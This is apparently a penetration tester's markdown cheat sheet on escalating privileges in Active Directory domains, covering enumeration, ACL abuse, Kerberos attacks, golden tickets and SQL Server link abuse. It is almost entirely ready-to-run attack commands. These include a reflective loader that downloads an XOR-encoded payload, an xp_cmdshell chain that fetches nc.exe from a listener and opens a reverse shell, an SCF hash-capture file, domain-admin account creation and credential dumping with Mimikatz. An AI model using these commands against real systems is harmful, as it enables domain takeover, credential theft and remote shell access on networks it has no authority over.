# Domain escalation

## **Domain enum**

### GUI enumeration

- [RSAT](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu)

> After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"

### Full enumeration

- [Bloodhound](https://github.com/BloodHoundAD/BloodHound) & [Sharphound injestor](https://github.com/BloodHoundAD/SharpHound3) or [bloodhound-python injestor](https://github.com/fox-it/BloodHound.py)
- [Ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
- [windapsearch](https://github.com/ropnop/windapsearch)
- [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [PowerView 2.0 Cheatsheet](https://gist.github.com/HarmJ0y/3328d954607d71362e3c)

```bash
# Install full bloodhound
sudo apt-get update && sudo apt-get install -y bloodhound python3-pip && pip3 install bloodhound
# bloodhound-python
bloodhound-python -d <domain> <user> -p <pass> -dc <fqdn_dc> -c All
# Custom queries
https://github.com/hausec/Bloodhound-Custom-Queries

# ldapdomaindump install
pip install ldapdomaindump
# ldapdomaindump usage
ldapdomaindump -u '<domain>\<user>' -p '<pass>' <target>

# widapsearch install 
git clone https://github.com/ropnop/windapsearch.git && pip install python-ldap && cd windapsearch
# windapsearch usage
./windapsearch.py -d <domain> -u <user> -p '<pass>' --da -o <output_dir> <target>
./windapsearch.py -d <domain> -u <user> -p '<pass>' --full -o <output_dir> <target>

#ldapsearch
sudo ldapsearch -x -LLL -H ldap://webmail.<domain>.fr -D "cn=<cn>" -b "dc=<domain>,dc=<fqdn>" -w '<pass>'

enum4linux -a <target>
```

### Find domain name

```bash
cat /etc/resolv.

Get-NetDomain
Get-DomainSID

nmap -sT -vvv --open -T2 -sC --script=*-ntlm-info -sV  -p 110,995,143,993,3389,23,25,465,587,119,433,563,1433,80,8080,443,8443 <targets>
```

### Users enumeration

Domain users and password policy \(especially complexity and lockout threshold for bruteforce\)

```bash
net user /domain

enum4linux <target> |grep "user:" | cut -d '[' -f2 | cut -d "]" -f1 > users.txt

$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = "(&(objectclass=computer))"
$Searcher.SearchRoot = ''
$Searcher.FindAll()

Get-NetUser | select samaccountname
```

### Users with SPN

```bash
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = "(&(!(samaccountname=krbtgt))(objectclass=user)(objectcategory=user)(servicePrincipalName=*))"
$Searcher.SearchRoot = ''
$Searcher.FindAll()

Get-NetUser -SPN | select samaccountname,serviceprincipalname
```


### Policy enumeration

Domain users and password policy \(especially complexity and lockout threshold for bruteforce\)

```bash
net accounts /domain

enum4linux -P -o <target>

(Get-DomainPolicy);"kerberos policy"
```

### Computers enumeration

Find DC IP

```bash
cat /etc/resolv.conf

nslookup <domain>

$Searcher = New-Object DirectoryServices.DirectorySearcher ; $Searcher.Filter = "(&(objectclass=user))" ; $Searcher.SearchRoot = '' ; $Searcher.FindAll()

Get-NetDomainController
```

Domain computers 

- [adidnsdump](https://github.com/dirkjanm/adidnsdump)
- [SharpSniper](https://github.com/HunnicCyber/SharpSniper)

```bash
netdom query SERVER

Get-ADComputer -Filter * -Property * | Select-Object Name,OperatingSystem,OperatingSystemVersion,ipv4Address | Export-CSV ADcomputerslist.csv -NoTypeInformation -Encoding UTF8

#pip install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump
adidnsdump -u <domain>\\<user> -p <pass>
adidnsdump -u <domain>\\<user> -p <pass> --forest --include-tombstoned
adidnsdump -u <domain>\\<user> -p <pass> --dns-tcp

# Find specific computer of domain user
SharpSniper.exe emusk <username> <password>

# Find computer where current user is local admin
Find-WMILocalAdminAccess

# Find computer where current can get a shell
Get-NetComputer -Unconstrained

# One-line powershell reverse lookup
for ($i=1; $i -le 254; $i++) { $a=Get-Random -Maximum 4; echo "10.11.12.$i"  $ErrorActionPreference = "SilentlyContinue"; [System.Net.DNS]::GetHostbyAddress("10.11.12.$i").HostName; $ErrorActionPreference = "Continue"; sleep $a }
```

### Shares enumeration

Look for anonymous SMB, NFS, FTP, etc

**SMB readable shares**

```bash
# ManSpider
git clone https://github.com/blacklanternsecurity/MANSPIDER && cd MANSPIDER && pipenv --python 3 shell
pip install -r requirements.txt
./manspider.py <target> -d <domain> -u <user> -p <pass> -f passw user admin account network login logon cred 
./manspider.py <target> -d <domain> -u <user> -p <pass> -c password -e xlsx
./manspider.py <target> -d <domain> -u <user> -p <pass> -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config 

# smbmap
smbmap -H IP -r DOSSIER
smbmap -H IP --download DOSSIER
smbmap -P 445 -H <target> -u '<user>' -p '<pass>' 
smbmap --host-file smb-hosts.txt -u '<user>' -p '<pass>' -q -R --depth 3 --exclude ADMIN$ IPC$ -A '(web|server|global|index|login|logout|auth|httpd|config).(xml|config|conf|asax|aspx|php|asp|jsp|html)'

# smbget & smbclient
smbget -rR smb://<target>/<share>/ -U <user>
smbclient \\\\<target>\\c$ -U <user>
smbclient -L //<target> -U '<domain>\<user>'

# SMB V1
smbclient -L ///192.168.0.1 -U <user> -c ls [--option='client min protocol=NT1']
mount //10.11.1.136/"Bob Share" /mnt/bob [-o vers=1.0]

# wireshark filter to find SMB version
smb.native_lanman
```

**SMB writable shares**

upload this @scf_filename.scf and listen for hashs using Responder/NTLMrelayx

> add a @ at first letter of the filename will place the .scf file on the top of the shared folder

```bash
[Shell]
Command=2
IconFile=\\<listener_ip>\share\<ico_name>.ico
[Taskbar]
Command=ToggleDesktop
```


**NFS**

```bash
showmount -e <target>
mount <target>:/home/xx /mnt/yy 
```

### Forest enumeration

```bash
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

Get-NetForest
Get-NetForestCatalog
Get-NetForestTrust
```

---

## **ACLs**


### GenericAll on user "alfred" from "jenaye" (Bloodhound)

its possible to use certipy like this `certipy shadow auto -username jenaye@<domain.local> -p 'AAAAA' -account alfred` to get hash of user alfred, but, you also can do it manualy : 

`proxychains python3 pywhisker.py -d <domain.local> -u jenaye -p 'AAAAA' --target alfred --action "add" --dc-ip <dc-ip> --filename alfred.pfx`

then 

`proxychains python3 gettgtpkinit.py -cert-pfx "alfred.pfx" -pfx-pass "<pass>" "<domain.local>/alfred" "alfred.ccache"`

and get nt hash of alfred : 

`KRB5CCNAME=alfred.ccache proxychains python3 getnthash.py <domain.local>/alfred -key <key>
`

> Its also possible to do this on machine acccount ( --target 'ComputerXXX$')


### ACLPwn

- [aclpwn.py](https://github.com/fox-it/aclpwn.py)
- [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)


```bash
# pip install aclpwn
python aclpwn.py -f <username> -ft user -d <domain> -dry
python aclpwn.py -f <computer_name> -ft computer -d <domain> -dry
python aclpwn.py -f <username> -ft user -d <domain>
python aclpwn.py -f <username> -ft user -d <domain>--restore aclpwn-20181129-182321.restore

# Powershell
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn 'Administrator'
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username <username> -Domain <domain> -Password <password>
```

### Manual Exploit DCSync

```bash
# Get ACL
Get-DomainObjectAcl -Identity <username> -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID <domain>) }

# Add DCSync
Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<local>" -PrincipalIdentity <username> -Rights DCSync

# Dump ntds 
meterpreter > dcsync_ntlm <DOMAIN>\<user>
```

---

## **Kerberos Tokens**

### Tools

- [Rubeus.exe](https://github.com/GhostPack/Rubeus) (DOTNET CSHARP)
- [Tokenvator](https://github.com/0xbadjuju/Tokenvator) (DOTNET CSHARP)
- [Incognito.exe](https://github.com/FSecureLABS/incognito) (Meterpreter extension)
- [TokenManipulation.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

Reflectively load DOTNET CSHARP Assembly within Powershell (or Cobalt, SilentTrinity etc.) if you cant do it through your C2 Infra :

```powershell
$wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
$k="xxxxxxx";$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://xxxxx")))|%{$_-bxor$k[$i++%$k.length]}
[System.Reflection.Assembly]::Load($b) | Out-Null
$parameters=@("arg1", "arg2")
[namespace.Class]::Main($parameters)
```

### Kerberos Dump

```bash
# List SPN
impacket GetUserSPNs.ps1

# Create new service ticket into memory
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SSQLSvc/xor-app23.xor.com:1433"

# Mimikatz
.\mimikatz.exe "log" "privilege::debug" "kerberos::list /export" exit
Invoke-Mimikatz -Command '"kereberos::list /export"'

# Rubeus
Rubeus.exe klist
Rubeus.exe dump
Rubeus.exe monitor /interval:5 /nowrap ; MS-RPRN.exe \\<DC.fqdn> \\<target.fqdn> ; Rubeus.exe ptt /ticket:<TGT_of_DC$> ; Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"' ; enter-pssessions -computername <DC.fqdn>
```

---

### Kerberos pre-auth

```bash
Rubeus.exe asreproast /outfile:asrep_hashes.txt

nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/users.txt <target>

./kerbrute_linux_amd64 userenum -d <domain> usernames.txt -debug

impacket-GetNPUsers -usersfile kerb_users.txt <domain>/<user> -dc-ip <dc_ip>
```

---

### Kerberoast attack

```bash
Rubeus.exe kerberoast /outfile:roasted_hashes.txt
```

---

### Kerberos impersonate

Find domain admin accounts 

```bash
net group "Domain Admins" /DOMAIN

Get-NetGroupMember -GroupName "Domain Admins" -Recurse
```

Find if one is loggedon somewhere :

```bash
crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --loggedon-users
bloodhound-python -d <domain> <user> -p <pass> -dc <fqdn_dc> -c LoggedOn
```

Impersonate kerberos token

```bash
# Rubeus
Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI>

# TokenManipulation
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"

# Incognito loaded by Meterpreter
load incognito 
list_tokens -u
impersonate_token <domain>\\<user> # Double slash is mandatory !

# Incognito standalone executable
Incognito.exe

# CrackMapExec using kerberos ticket
export KRB5CCNAME=<user>.ccache 
sudo cme smb <target> --kerberos -x whoami
```

Check if a computer has the TrustedForDelegation flag enabled

```bash
Get-ADComputer -Identity <computer_name> -Properties TrustedForDelegation
```

Create new Domain Admin account 

```bash
net user add <user> <pass> /domain
net group "Domain Admins" <user> /add
```

### Golden Ticket

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<pwned_domain.fqdn> /sid:<pwned_domain_sid> /sids:<enterprise_admin_sid> /krbtgt:<krbtgt_hash> /ticket:krbtgt.kirbi"'
Invoke-Mimikatz -Command '"kerberos::ptt krbtgt.kirbi"'
ls \\<target_DC.fqdn>\C$

Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:<domain.fqdn> /all"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<pwned_domain.fqdn> /sid:S-1-5-21-77175520-687805270-358672322 /sids:S-1-5-21-1458491649-1432147247-1990877046-519 /krbtgt:1ee3a9c4a96c4450878eaa8cb45b29fb /ptt"'
gwmi -class win32_operatingsystem -ComputerName <target_DC.fqdn>
```


---

### Manual testing

- [secureauth.com](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/)

### Delegation Explained

- [specterops.io](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

## **SQL exploit**

Trusted Links (pwn even across forests trusts)

```bash
.\PowerUpSQL.ps1
Get-SQLInstanceLocal
Get-SQLInstanceDomain
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded

Get-SQLServerLink  -Verbose -Instance <fqdn_db_target>
Get-SQLServerLinkCrawl  -Verbose -Instance <fqdn_db_target>
Get-SQLServerLinkCrawl  -Verbose -Instance <fqdn_db_target> -Query 'exec master..xp_cmdshell "whoami"'
Get-SQLServerLinkCrawl  -verbose -Instance <fqdn_db1> -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<fqdn_db2>"'
Get-SQLServerLinkCrawl -Instance <fqdn_db_target> -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadFile(''http://<listener_ip>/nc.exe'',''C:\Windows\Temp\nc.exe'')"' ; Get-SQLServerLinkCrawl -Instance <fqdn_db_target> -Query 'exec master..xp_cmdshell "C:\Windows\Temp\nc.exe -e cmd <listener_ip> 1234"'

Invoke-SQLEscalatePriv -Verbose -Instance "SQLServer1\Instance1"

Invoke-SQLAudit -Verbose -Instance <db_target>

SELECT IS_SRVROLEMEMBER ('sysadmin') , IS_MEMBER ('db_owner'), USER_NAME()
exec master.dbo.xp_dirtree '\\<attacker_IP>\<sharename>\xpdirtree_exploit'
SELECT IS_SRVROLEMEMBER ('sysadmin') , IS_MEMBER ('db_owner'), USER_NAME()

EXECUTE AS USER='dbo'
ALTER SERVER ROLE [sysadmin]
ADD MEMBER [<domain\sql_svc_user>]
EXEC sp_configure 'show advanced options',1

EXEC sp_configure 'xp_cmdshell',1
EXEC master..xp_cmdshell 'whoami'

#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN <user> WITH PASSWORD = ''''<pass>'''' '') AT "<domain>\<server1>"') AT "<domain>\<server2>"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''<user>'''' , ''''sysadmin'''' '') AT "<domain>\<server1>"') AT "<domain>\<server2>"

# Remediation
REVOKE Execute ON xp_dirtree FROM PUBLIC
```


